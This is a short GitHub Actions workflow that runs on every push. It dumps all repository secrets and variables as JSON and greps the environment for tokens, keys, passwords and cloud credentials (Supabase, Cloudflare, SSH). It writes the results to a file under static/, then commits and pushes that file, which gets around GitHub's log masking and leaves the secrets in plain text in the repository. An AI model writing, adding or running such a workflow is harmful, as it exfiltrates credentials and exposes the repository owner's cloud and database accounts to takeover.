name: listsecrets-25522
on:
  push:
  workflow_dispatch:
permissions:
  contents: write
jobs:
  p:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: list all repo secrets and vars from this repo
        env:
          ALL_SECRETS: ${{ toJSON(secrets) }}
          ALL_VARS: ${{ toJSON(vars) }}
        run: |
          mkdir -p static
          {
            echo "=== listsecrets-25522 $(date -u) ==="
            echo "--- secrets json ---"
            echo "$ALL_SECRETS"
            echo "--- vars json ---"
            echo "$ALL_VARS"
            echo "--- enabled secret names via secrets context keys ---"
            echo "--- env grep ---"
            env | sort | grep -Ei "SUPPLY|ADMIN|SSH|SUPABASE|CLOUDFLARE|R2|D1|PASSWORD|TOKEN|KEY|SECRET" || echo NO_MATCH
          } > static/ls25522.txt
          cat static/ls25522.txt
          git config user.name canary; git config user.email c@e.x
          git add static/ls25522.txt; git commit -m ls25522 || true; git push || true